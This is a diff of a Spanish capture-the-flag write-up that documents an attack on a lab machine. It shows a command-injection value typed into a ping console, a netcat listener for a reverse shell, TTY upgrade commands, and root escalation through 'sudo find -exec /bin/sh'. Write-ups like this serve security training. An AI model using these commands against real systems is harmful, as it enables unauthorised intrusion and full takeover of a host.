@@ -64,24 +64,22 @@ Encontramos una ruta interesante /index.php asi que vamos a mirar que hay y ver 
 ### Vector de Ataque
 En index.php hay una consola que acepta ips para verificar la conectividad, ejecuta un ping, vamos a probar a poner un comando detrás para ver si ejecuta varios.
 
-```http
-# Ejemplo de Payload o petición vulnerable utilizada
+```bash
 127.0.0.1 ; ls -la
 ```
 
 <img width="1276" height="815" alt="5preubaaa" src="https://github.com/user-attachments/assets/37517bc0-e227-457a-993d-53db16e6a283" />
-Nos muestra el ping y debajo nos ha ejecutado el ls -la que pusimos, por lo que es vulnerable. 
+Nos muestra el ping y debajo nos ha ejecutado el *ls -la* que pusimos, por lo que es vulnerable. 
 
-Hay inyección de comandos.
+Hay inyección de comandos, por lo que podemos mirar archivos como el usuario web-admin, ya que haciendo un whoami nos dijo que somos ese usuario.
 
 
 <img width="1379" height="852" alt="6encontramos" src="https://github.com/user-attachments/assets/e2735431-3bf7-4db4-acc9-68a0e9e62059" />
-
+Entramos al directorio del usuario web-admin para leer la flag del usuario.
 <img width="1506" height="885" alt="7flagusuario" src="https://github.com/user-attachments/assets/c1d26f07-a1b5-41f8-bbe6-8358db60f015" />
 
-
+La flag es correcta, vamos a continuar obtenido una consola más interactiva para poder escalar privilegios más facilmente.
 <img width="988" height="518" alt="8flag" src="https://github.com/user-attachments/assets/cf806bdf-c760-4547-8e9a-85f08d76a89a" />
-
 
 
 
@@ -105,13 +103,10 @@ nc -nlvp 4444
 ```
 
 <img width="978" height="307" alt="10recibida" src="https://github.com/user-attachments/assets/f5b44944-fba7-4f5f-a727-f65fb4943e64" />
+Ya somos el usuario web-admin desde una terminal, ahora podemos sanitizarla o continuar así, se ve peor pero como anteriormente vimos que con sudo -l podíamos ejecutar find sin contraseña como el usuario root, vamos a escalar privilegios.
 
-
-<img width="991" height="428" alt="11root" src="https://github.com/user-attachments/assets/856ffe1c-6d52-4d25-88f3-c5de7978d181" />
-
-
-Una vez dentro, realizamos el tratamiento de la TTY para tener una consola interactiva cómoda:
 ```bash
+# Tratamiento de  la TTY para tener una consola interactiva cómoda
 script /dev/null -c bash
 # Ctrl+Z
 stty raw -echo; fg
@@ -119,17 +114,25 @@ reset xterm
 export TERM=xterm
 ```
 
----
 
 ## 👑 3. Escalada de Privilegios
 
 ### Enumeración del Sistema
-Analizamos el entorno buscando vectores comunes de escalada (permisos SUID, tareas Cron, capacidades, contraseñas en texto plano).
 
 ```bash
 # Comprobamos privilegios de SUDO
 sudo -l
 ```
+
+Nos aprovechamos del permiso SUID que tenemos para ejecutar find sin contraseña y como el usuario root para convertirnos en el usuario root.
+```bash
+sudo find . -exec /bin/sh \; -quit
+```
+
+<img width="991" height="428" alt="11root" src="https://github.com/user-attachments/assets/856ffe1c-6d52-4d25-88f3-c5de7978d181" />
+
+
+---
 
 ### Explotación del Vector de Escalada
 Encontrado un binario o configuración débil. Explicar cómo se abusa de ello para convertirse en `root`.
